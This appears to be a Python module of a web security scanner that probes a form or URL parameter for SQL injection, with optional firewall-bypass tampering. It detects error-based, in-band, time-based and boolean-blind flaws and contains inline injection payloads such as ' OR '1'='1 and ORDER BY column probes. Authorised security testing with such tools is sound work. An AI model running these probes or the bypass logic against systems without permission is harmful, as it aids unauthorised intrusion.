import time
import difflib
from .tampering import apply_tampering
from . import bypass_oracle
from bs4 import BeautifulSoup

SQLI_ERROR_MARKERS = [
    "SQL syntax", "mysql_", "MySQL Error", "valid MySQL result",
    "check the manual that corresponds to your MySQL",
    "PostgreSQL query failed", "valid PostgreSQL result", "unterminated quoted string",
    "Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark",
    "SQL Server error", "ORA-", "Oracle error", "quoted string not properly terminated",
    "SQLite", "SQLITE_ERROR", "Sequelize", "Java.sql.SQLException", "Fatal error",
    "syntax error at or near", "Unexpected end of command", "QueryFailedError"
]

SUCCESS_KEYWORDS = ["welcome", "access granted", "logout", "admin panel", "successfully"]
FAIL_KEYWORDS = ["not found", "denied", "incorrect", "failure", "invalide"]

TIME_MARGIN_SECONDS = 4
STABILITY_THRESHOLD = 0.97


def load_payloads_from_file(filename="payloads/sqli.txt"):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        return ["' OR '1'='1"]


def send_probe(engine, url, method, base_params, param_name, raw_text, waf_bypass_enabled, waf_name, technique):
    value = apply_tampering(raw_text, 'sqli', waf_bypass_enabled, waf_name, technique=technique)

    start = time.time()
    if waf_bypass_enabled:
        resp = engine._send_request_raw(url, method, base_params, param_name, value)
    else:
        data = dict(base_params)
        data[param_name] = value
        resp = engine._send_request(url, method=method, data=data if method == 'POST' else None,
                                     params=data if method == 'GET' else None)
    duration = time.time() - start

    if resp is not None:
        return duration, resp.status_code, len(resp.text), resp.text, value
    return duration, 0, 0, "", value


def _profile_boolean_diff(text_true, text_fail):
    profile = {'success_found': False, 'fail_found': False}
    try:
        soup_true = BeautifulSoup(text_true, 'html.parser')
        soup_fail = BeautifulSoup(text_fail, 'html.parser')
        text_true_clean = soup_true.body.text.lower() if soup_true.body else soup_true.text.lower()
        text_fail_clean = soup_fail.body.text.lower() if soup_fail.body else soup_fail.text.lower()

        for kw in SUCCESS_KEYWORDS:
            if kw in text_true_clean:
                if kw not in text_fail_clean or text_true_clean.count(kw) > text_fail_clean.count(kw):
                    profile['success_found'] = True
                    break

        for kw in FAIL_KEYWORDS:
            if kw in text_fail_clean:
                if kw not in text_true_clean or text_fail_clean.count(kw) > text_true_clean.count(kw):
                    profile['fail_found'] = True
                    break
    except Exception:
        pass
    return profile


def discover_column_count(engine, url, method, base_params, param_name, waf_bypass_enabled, waf_name, technique):
    max_columns = 15

    base_resp = engine._send_request(url, method=method,
                                      data=base_params if method == 'POST' else None,
                                      params=base_params if method == 'GET' else None)
    if base_resp is None:
        return None
    base_code = base_resp.status_code

    for count in range(1, max_columns + 1):
        raw = f"' ORDER BY {count} -- "
        _, code, _, text, _ = send_probe(engine, url, method, base_params, param_name, raw,
                                          waf_bypass_enabled, waf_name, technique)
        if code == 0:
            continue
        is_error = code != base_code or any(err.lower() in text.lower() for err in SQLI_ERROR_MARKERS)
        if is_error:
            return count - 1

    return None


def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled, waf_name=None):
    url = injection_point['url']
    method = injection_point['method']
    defaults = injection_point.get('defaults', {})

    csrf_token_data = {}
    if method == 'POST' and hasattr(engine, 'csrf_token') and isinstance(engine.csrf_token, dict):
        csrf_token_data = engine.csrf_token

    base_params = defaults.copy()
    if method == 'POST':
        base_params.update(csrf_token_data)
    base_params[param_name] = "WAFMAP_SAFE_VAL"

    forced_technique = None
    if waf_bypass_enabled:
        forced_technique = bypass_oracle.probe_and_get_technique(
            engine, url, method, base_params, param_name, 'sqli', waf_name
        )

    column_count = None
    if level >= 2:
        column_count = discover_column_count(engine, url, method, base_params, param_name,
                                              waf_bypass_enabled, waf_name, forced_technique)

    baseline_time_1, base_code, base_len, base_text, _ = send_probe(
        engine, url, method, base_params, param_name, "WAFMAP_SAFE_VAL", waf_bypass_enabled, waf_name, forced_technique)
    if base_code == 0:
        return

    baseline_time_2, _, _, _, _ = send_probe(
        engine, url, method, base_params, param_name, "WAFMAP_SAFE_VAL", waf_bypass_enabled, waf_name, forced_technique)
    baseline_time = max(baseline_time_1, baseline_time_2)

    true_raw = "WAFMAP_SAFE_VAL' OR 1=1 -- "
    false_raw = "WAFMAP_SAFE_VAL' OR 1=0 -- "

    _, _, _, text_fail, _ = send_probe(engine, url, method, base_params, param_name, false_raw, waf_bypass_enabled, waf_name, forced_technique)
    _, _, _, text_true, _ = send_probe(engine, url, method, base_params, param_name, true_raw, waf_bypass_enabled, waf_name, forced_technique)
    _, _, _, text_true_retry, _ = send_probe(engine, url, method, base_params, param_name, true_raw, waf_bypass_enabled, waf_name, forced_technique)

    stability = difflib.SequenceMatcher(None, text_true, text_true_retry).ratio()
    page_is_stable = stability >= STABILITY_THRESHOLD

    sim_bool = difflib.SequenceMatcher(None, text_fail, text_true).ratio()
    is_boolean_vulnerable = page_is_stable and sim_bool < 0.98

    semantic_profile = _profile_boolean_diff(text_true, text_fail)

    if level >= 2 and not page_is_stable and engine.config['verbose']:
        print(f"[SQLI] Page instable sur {url} ({param_name}) : boolean-blind désactivé pour ce paramètre.")

    payloads = load_payloads_from_file()

    for payload in payloads:
        if engine.is_vector_confirmed('SQLi', url, param_name):
            return

        if level == 1 and ("SLEEP" in payload or "WAITFOR" in payload):
            continue

        req_time, code, length, text, final_payload = send_probe(
            engine, url, method, base_params, param_name, payload, waf_bypass_enabled, waf_name, forced_technique)

        if code == 0:
            continue

        error_hit = False
        for error in SQLI_ERROR_MARKERS:
            if error.lower() in text.lower():
                engine.add_vulnerability("SQLi (Error-Based)", url, final_payload, f"Erreur BDD: {error}", parameter=param_name)
                error_hit = True
                break
        if error_hit:
            return

        if "WAFMAP" in text.upper():
            payload_cols = payload.upper().count('WAFMAP')
            if not column_count or payload_cols == column_count:
                engine.add_vulnerability("SQLi (In-Band)", url, final_payload, "Marqueur reflété", parameter=param_name)
                return

        if ("SLEEP" in payload or "WAITFOR" in payload) and req_time > (baseline_time + TIME_MARGIN_SECONDS):
            confirm_time, _, _, _, _ = send_probe(
                engine, url, method, base_params, param_name, payload, waf_bypass_enabled, waf_name, forced_technique)

            if confirm_time > (baseline_time + TIME_MARGIN_SECONDS):
                engine.add_vulnerability(
                    "SQLi (Time-Based)", url, final_payload,
                    f"Délai reproduit deux fois : {req_time:.2f}s puis {confirm_time:.2f}s "
                    f"(baseline {baseline_time:.2f}s).",
                    parameter=param_name,
                    confidence="Confirmée"
                )
                return

            engine.add_vulnerability(
                "SQLi (Time-Based, non reproduit)", url, final_payload,
                f"Premier délai de {req_time:.2f}s (baseline {baseline_time:.2f}s) non reproduit à la deuxième "
                f"tentative ({confirm_time:.2f}s). Possible faux positif dû au réseau : à revérifier manuellement.",
                parameter=param_name,
                confidence="A vérifier"
            )

        if code == 500 and base_code == 200:
            engine.add_vulnerability("SQLi (Blind/Error)", url, final_payload, "Erreur Serveur 500 provoquée", parameter=param_name)
            return

        if is_boolean_vulnerable:
            _, _, _, text_attack, _ = send_probe(
                engine, url, method, base_params, param_name, payload, waf_bypass_enabled, waf_name, forced_technique)

            is_semantic_success = semantic_profile['success_found'] and any(kw in text_attack.lower() for kw in SUCCESS_KEYWORDS)
            sim_attack = difflib.SequenceMatcher(None, text_true, text_attack).ratio()

            if sim_attack > 0.95 or is_semantic_success:
                details = f"Réponse similaire à l'état VRAI (Similitude: {sim_attack:.3f}, stabilité page: {stability:.3f})"
                if is_semantic_success:
                    details += " - Confirmation sémantique (Succès)"
                if waf_bypass_enabled and forced_technique:
                    details += f" - Technique de bypass utilisée : {forced_technique}"

                engine.add_vulnerability("SQLi (Boolean Blind)", url, final_payload, details, parameter=param_name)
                return
